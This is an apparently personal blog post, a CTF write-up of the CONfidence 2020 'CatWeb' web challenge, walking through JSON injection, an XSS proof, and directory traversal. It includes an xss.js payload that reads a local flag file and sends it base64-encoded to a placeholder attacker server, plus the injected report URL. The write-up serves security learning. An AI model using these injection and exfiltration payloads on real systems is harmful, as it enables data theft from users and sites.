@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang='en'>
+  <head>
+  <title>C o nfidence 2020 cat web | Jamvie: CTF writeups and more</title>
+  <meta charset='utf-8'>
+  <meta name = 'viewport' content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>
+  <meta http-equiv = 'X-UA-Compatible' content = 'IE=edge'>
+  <meta name = 'SKYPE_TOOLBAR' content = 'SKYPE_TOOLBAR_PARSER_COMPATIBLE' /><meta name = 'keywords' content = 'Jamvie: CTF writeups and more'>
+<meta property = 'og:locale' content = 'en_US' />
+<meta property = 'og:type' content = 'article' />
+<meta property = 'og:title' content = 'CONfidence 2020: CatWeb' />
+<meta property = 'og:description' content = 'I participated in CONfidence CTF 2020 teasers in March of this year. I was focusing mainly on this problem, and it really helped me broaden my skills …'>
+<meta property = 'og:url' content = 'https://jamvie.net/post/02confidence2020_01/' />
+<meta property = 'og:image' content = 'https://jamvie.net/images/CatWeb.jpg'/>
+<link rel='apple-touch-icon' sizes='180x180' href='https://jamvie.net/images/icons/apple-touch-icon.png'>
+<link rel='icon' type='image/png' sizes='32x32' href='https://jamvie.net/images/icons/favicon-32x32.png'>
+<link rel='icon' type='image/png' sizes='16x16' href='https://jamvie.net/images/icons/favicon-16x16.png'>
+<link rel='manifest' href='https://jamvie.net/images/icons/site.webmanifest'>
+<meta name='msapplication-TileColor' content='#da532c'>
+<meta name='theme-color' content='#ffffff'>
+
+  <link rel='canonical' href='https://jamvie.net/post/02confidence2020_01/'>
+  <link rel = 'stylesheet' href = 'https://jamvie.net/css/main.a9f0d07ece0d4b9cee910125ba1579a4e144c2cb962e6398f53fc29c8db92527c9ab161c6fe73daafaa5ab29c6ba46a739f7855ed85797338a9852614bc4dfaa.css' integrity = 'sha512-qfDQfs4NS5zukQEluhV5pOFEwsuWLmOY9T/CnI25JSfJqxYcb&#43;c9qvqlqynGukanOfeFXthXlzOKmFJhS8Tfqg=='>
+</head>
+
+  <body>
+    <div class = 'nav-drop'>
+  <div class = 'nav-body'>
+    
+      <a href = 'https://jamvie.net/' class = 'nav_item'>Blog</a>
+    
+      <a href = 'https://jamvie.net/about/' class = 'nav_item'>About Me</a>
+    
+      <a href = 'https://jamvie.net/tags' class = 'nav_item'>Tags</a>
+    
+      <a href = 'https://jamvie.net/post/' class = 'nav_item'>Archive</a>
+    
+      <a href = 'https://jamiepoli.github.io/' class = 'nav_item'>Personal Site</a>
+    
+    <div class = 'nav-close'></div>
+    <div class = 'color_mode'>
+<label for = 'mode'>Toggle Dark Mode</label>
+<input type = 'checkbox' class = 'color_choice' id = 'mode'>
+</div>
+
+  </div>
+</div>
+<header class = 'nav' >
+  <nav class = 'nav-menu'>
+    <a href='https://jamvie.net/' class = 'nav-brand nav_item'>Jamvie: CTF writeups and more</a>
+    <div class = 'nav_bar-wrap'>
+      <div class = 'nav_bar'></div>
+    </div>
+  </nav>
+</header>
+
+
+    <main>
+      
+  <div class = 'wrap mt post'>
+    <div><p class = 'post_date pale'>22. April 2020</p>
+      <h1 class = 'post_title'>CONfidence 2020: CatWeb</h1>
+      <div class = 'post_body'>
+        <div class = 'post_inner'>
+        
+          <img src = 'https://jamvie.net/images/CatWeb.jpg' alt = 'CatWeb.jpg' class = 'post_thumbnail'>
+        
+          <p>I participated in CONfidence CTF 2020 teasers in March of this year. I was focusing mainly on this problem, and it really helped me broaden my skills in JSON-related attacks! I have never seen many JSON injections before this, so this was welcome practise.</p>
+<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
+<p>The link to the webpage is: <code>http://catweb.zajebistyc.tf/</code></p>
+<p>We have a basic webpage with photos of cute cats filtered by their color. The drop down menu will give us black, red, grey and white cats. At the bottom is a report button, which will take whatever input we get, send it to some server, and respond to us that our report has been&hellip;well. Reported.</p>
+<p><img src="https://raw.githubusercontent.com/jamiepoli/JamvieCTF/master/content/images/CatWeb_HomePage.png" alt="HomePage"></p>
+<p>Checking out the response content as I was clicking about the page showed me the requests for the &ldquo;kind&rdquo; (colour) of cats I chose based on the drop down menu. The request was just a small JSON string stipulating what kind I asked for, and I guess the server takes that input and returns whatever.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">curl &#34;http://catweb.zajebistyc.tf/cats?kind=grey&#34;
+</code></pre></td></tr></table>
+</div>
+</div><p>That got me thinking, can I ask for cats of a kind not in the drop down menu? 
+Editing the request to change the kind from a colour to just absolute garbage&hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">curl &#34;http://catweb.zajebistyc.tf/?kind=djfa&#34;
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://raw.githubusercontent.com/jamiepoli/JamvieCTF/master/content/images/NotFound.png" alt="brokenrequest"></p>
+<p>Aha! Our text got echoed back to us in the response. There isn&rsquo;t any input validation in the JSON request! This must be a way in.</p>
+<p>To test how far I could go with it, I decided to hide an XSS in the JSON, seeing as how the URL we are taken to after any sort of response also has the JSON text in it.</p>
+<p>I typed this in as the URL:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://catweb.zajebistyc.tf/?&#34;,&#34;status&#34;:&#34;ok&#34;,&#34;content&#34;:[&#34;\&#34;&lt;img src=deadbeef onerror=alert(document.title)&gt; &lt;/img&gt;],&#34;ignore&#34;:&#34;
+</code></pre></td></tr></table>
+</div>
+</div><p>If there was a JSON vulnerability here, then going to this website would load up an alert with the title of the webpage (&ldquo;my cats&rdquo;). What would happen is it would attempt to load an image from the source called &ldquo;deadbeef&rdquo;, and when it can&rsquo;t find the source, it would load as an error. If the image loaded as an error, pop up an alert with the name of the webpage.</p>
+<p><img src="https://raw.githubusercontent.com/jamiepoli/JamvieCTF/master/content/images/XSSJsonInCatWeb.png" alt="XSS"></p>
+<p>:) Great! There is definitely JSON injection in play here. Let&rsquo;s see what we can do with it!</p>
+<p>Using curl to delve deeper into the webpage, I tried to make it list directories with the command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">curl &#34;http://catweb.zajebistyc.tf/cats?kind=..&#34;
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://raw.githubusercontent.com/jamiepoli/JamvieCTF/master/content/images/CatWebTemplates.png" alt="templates"></p>
+<p>I traversed through the directories, but in the templates subfolder&hellip;</p>
+<p><img src="https://raw.githubusercontent.com/jamiepoli/JamvieCTF/master/content/images/CatWebFlagLocn.png" alt="flagLocn"></p>
+<p>Aha! The <code>flag.txt</code> file is in there. Now we just need to somehow read it from the browser. The fact that I was able to find the local files like this means something: the path of templates looks alot like <code>file:///app/templates/flag.txt</code> - Note the root path name: file. A same-origin policy here could treat all files with this starting origin as from the same place.</p>
+<p>We can use this to our advantage: create an XSS attack on the <code>file://</code> path.</p>
+<p>Since an XSS endpoint was found using the JSON vulnerabilities in the URL, and there exists a report function, this is all a pretty classic XSS attack from here:</p>
+<p>Craft our payload script to fetch the flag.txt from <code>file://</code>. Here&rsquo;s mine called (xss.js):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">url</span><span class="o">=</span><span class="s1">&#39;http://yourServer.com/6060?&#39;</span>
+<span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;file:///app/templates/flag.txt&#39;</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">resp</span><span class="p">=&gt;</span><span class="nx">resp</span><span class="p">.</span><span class="nx">text</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">flag</span><span class="p">=&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="o">+</span><span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span> <span class="o">||</span> <span class="s1">&#39;Nothing&#39;</span><span class="p">)));</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Report this url with our payload in it:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">file:///app/templates/index.html?&#34;, &#34;status&#34;: &#34;ok&#34;, &#34;content&#34;:[&#34;\u0022&gt;&lt;script src=http://yourServer.com:6060/xss.js&gt;&lt;/script&gt;&#34;],&#34;ignore&#34;:&#34;
+</code></pre></td></tr></table>
+</div>
+</div><p>Now we wait for our server to retrieve the flag for us once someone checks out our reported URL :)</p>
+<p><code>flag:p4{can_i_haz_a_piece_of_flag_pliz?}</code></p>
+<p>This was a cool challenge to do that really helped me stretch my XSS skills and teach me how to be thorough when scoping out webpages for possible XSS attacks. I quite enjoyed this challenge! Thank you to <a href="https://p4.team/">P4</a> for hosting the CONfidence 2020 teaser :)</p>
+<p>Jam</p>
+<h2 id="references">References</h2>
+<p>feature image credit: <a href="https://www.pexels.com/@peng-louis-587527">Peng Louis</a> on Pexels</p>
+        </div>
+        <div class ='post_extra mb-2'>
+          <div class = 'copy'></div>
+
+        </div>
+        <div>
+        
+        </div>
+      </div>
+    </div>
+  </div>
+  <a href = 'https://jamvie.net/' class = 'post_nav'><span class = 'post_next'>The Latest</span>T</a>
+
+    </main>
+    <footer class = 'footer wrap pale'>
+  <p>&copy;&nbsp;<span class = 'year'></span>&nbsp;Jamvie: CTF writeups and more</p>
+  <p>Designed by  <a href = 'https://www.linkedin.com/in/dan-weru-profile/' target = '_blank' title = 'Linkedin Profile' rel = 'nonopener'>Weru</a></p>
+</footer>
+
+
+<script src = 'https://jamvie.net/js/index.min.d69f471ae38fbfddb2d849ebf49889f0b3b3060efe637469d94aed178db3e067313fbee0a083cbccb6941a1367f743bd80686414fd921175f0d60b52b68eaa67.js'></script>
+
+  </body>
+</html>
